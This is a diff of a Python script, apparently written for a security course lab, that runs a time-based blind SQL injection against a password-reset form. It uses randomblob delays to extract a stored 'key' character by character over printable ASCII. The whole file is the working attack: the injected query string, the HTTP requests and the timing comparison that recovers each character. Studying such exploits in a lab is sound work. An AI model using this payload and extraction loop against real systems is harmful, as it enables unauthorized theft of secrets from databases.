@@ -10,21 +10,15 @@ Irfansha Shaik
 
 '''
 todos:
-- Instead of checking where the username is admin
-  we will check if the key characters one by one (by sql injection).
-  But we need to consider if the characters are alpha-numeric or more.
+- First we only test with ascii from 32 to 126
+- Create a file to append the identified characters in keys
 '''
 
 import requests
 import time
 
-def get_usernames():
-  users = []
-  users.append("admin")
-  return users
-
-def test_username(username):
-  payload= {'username': username, 'Submit':'submit'}
+def test_username():
+  payload= {'username': 'admin', 'Submit':'submit'}
   #r = requests.get('http://lbs-2020-02.askarov.net:3030/', data=data)
   start_time = time.time()
   s = requests.post('http://lbs-2020-02.askarov.net:3030/reset/', payload)
@@ -34,26 +28,29 @@ def test_username(username):
   return time_taken
 
 
-def test_injection():
-  inject_query = "admin' AND substr(key, 1,1) = '^' AND randomblob(400000000) = 453454331000 OR 'username'='"
+def test_injection(char_index, test_asci):
+  inject_query = "admin' AND substr(key, " + str(char_index) + ",1) = '" + str(test_asci) + "' AND randomblob(130000000) = 453454331000 OR 'username'='"
+  #print(inject_query)
   payload= {'username': inject_query, 'Submit':'submit'}
-  #r = requests.get('http://lbs-2020-02.askarov.net:3030/', data=data)
   start_time = time.time()
   s = requests.post('http://lbs-2020-02.askarov.net:3030/reset/', payload)
   time_taken = (time.time() - start_time)
   # We need to assert if the resultant string is a success
-  #print(r1.text)
+  assert(s.text == 'password reset email has been queued')
+  #print(s.text)
   return time_taken
 
 
 
 def main():
-  usernames = get_usernames()
-  for user_name in usernames:
-    user_time = test_username(user_name)
-    print(user_time)
-  inject_time = test_injection()
-  print(inject_time)
+  for char_index in range(35,3000):
+    for i in range(32,127):
+      test_time = test_username()
+      inject_time = test_injection(char_index, chr(i))
+      if (inject_time > test_time + 1 ):
+        print("pos: ", char_index, "char: ", chr(i))
+        print(test_time, inject_time)
+        break
 
 
 if __name__== "__main__":
